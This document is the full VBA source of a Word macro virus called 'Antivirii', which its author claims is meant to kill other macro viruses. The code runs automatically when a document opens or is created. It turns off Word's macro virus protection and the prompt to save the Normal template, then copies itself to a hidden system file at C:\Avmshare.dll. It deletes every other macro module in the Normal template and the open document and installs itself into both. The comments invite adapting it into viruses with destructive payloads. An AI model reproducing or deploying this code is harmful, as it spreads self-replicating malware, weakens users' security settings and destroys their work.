Attribute VB_Name = "Antivirii"
' This is a macro virus made to kill macro viruses...
' Well, it will kill any modules etc. but that's a piece of life...
' It is very very simple, and with a few changes can be used
' by anyone to create other viruses... with destructive payload

Dim thing As Object

Sub AutoOpen()
On Error Resume Next
    CreatKeyFile
    SetDefOpt
    InsNormal
    InsActive
End Sub

Sub AutoNew()
    CreatKeyFile
    InsActive
End Sub

Sub SetDefOpt()
    Options.VirusProtection = (2 - (4 / 2))
    Options.ConfirmConversions = (2 - 1) - 1
    Options.BackgroundSave = True
    Options.SaveNormalPrompt = (8 + (8 - 16))
End Sub

Sub AutoExec()
    SetDefOpt
End Sub

Sub CreatKeyFile()
    For Each thing In ActiveDocument.VBProject.VBComponents
        If thing.Name = "Antivirii" Then
            thing.Export "C:\Avmshare.dll"
            SetAttr "C:\Avmshare.dll", vbHidden + vbSystem
        End If
    Next thing
    For Each thing In NormalTemplate.VBProject.VBComponents
        If thing.Name = "Antivirii" Then
            thing.Export "C:\Avmshare.dll"
            SetAttr "C:\Avmshare.dll", vbHidden + vbSystem
        End If
    Next thing

End Sub

Sub InsNormal()
    For Each thing In NormalTemplate.VBProject.VBComponents
        If Not ((thing.Name = "Antivirii") Or (thing.Name = "ThisDocument")) Then
            NormalTemplate.VBProject.VBComponents.Remove (thing)
        End If
    Next thing
    For Each thing In NormalTemplate.VBProject.VBComponents
        If thing.Name = "Antivirii" Then Exit Sub
    Next thing
    NormalTemplate.VBProject.VBComponents.Import "C:\Avmshare.dll"
End Sub

Sub InsActive()
    For Each thing In ActiveDocument.VBProject.VBComponents
        If Not ((thing.Name = "Antivirii") Or (thing.Name = "ThisDocument")) Then
            ActiveDocument.VBProject.VBComponents.Remove (thing)
        End If
    Next thing
    For Each thing In ActiveDocument.VBProject.VBComponents
        If thing.Name = "Antivirii" Then Exit Sub
    Next thing
    ActiveDocument.VBProject.VBComponents.Import "C:\Avmshare.dll"
End Sub
